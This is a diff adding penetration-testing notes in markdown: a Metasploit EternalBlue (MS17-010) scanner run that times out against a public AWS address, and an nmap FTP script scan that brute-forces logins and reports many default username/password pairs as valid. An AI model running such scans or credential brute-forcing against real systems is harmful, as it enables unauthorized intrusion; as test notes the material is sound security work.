@@ -404,3 +404,46 @@ Getting resource at ajp13://18.220.190.92:8009/asdf
 ```
 
 
+# Testing for MS17-010 ETERNAL BLUE
+
+``` bash
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) > run
+
+[-] 18.220.190.92:445     - Rex::ConnectionTimeout: The connection with (18.220.190.92:445) timed out.
+[*] 18.220.190.92:445     - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/smb/smb_ms17_010) > 
+
+```
+
+# Testing FTP
+
+``` bash
+
+─# nmap --script ftp-* p21 18.220.190.92                                                                                  255 ⨯
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-19 13:49 PDT
+Failed to resolve "p21".
+Stats: 0:00:05 elapsed; 0 hosts completed (0 up), 1 undergoing Ping Scan
+Ping Scan Timing: About 100.00% done; ETC: 13:50 (0:00:00 remaining)
+Nmap scan report for ec2-18-220-190-92.us-east-2.compute.amazonaws.com (18.220.190.92)
+Host is up (0.081s latency).
+Not shown: 143 closed tcp ports (reset)
+PORT      STATE    SERVICE
+21/tcp    open     ftp
+| ftp-brute: 
+|   Accounts: 
+|     root:root - Valid credentials
+|     user:user - Valid credentials
+|     web:web - Valid credentials
+|     netadmin:netadmin - Valid credentials
+|     guest:guest - Valid credentials
+|     sysadmin:sysadmin - Valid credentials
+|     administrator:administrator - Valid credentials
+|     webadmin:webadmin - Valid credentials
+|     admin:admin - Valid credentials
+|     test:test - Valid credentials
+|_  Statistics: Performed 117 guesses in 4 seconds, average tps: 29.2
+|_ftp-libopie: ERROR: Script execution failed (use -d to debug)
+
+```
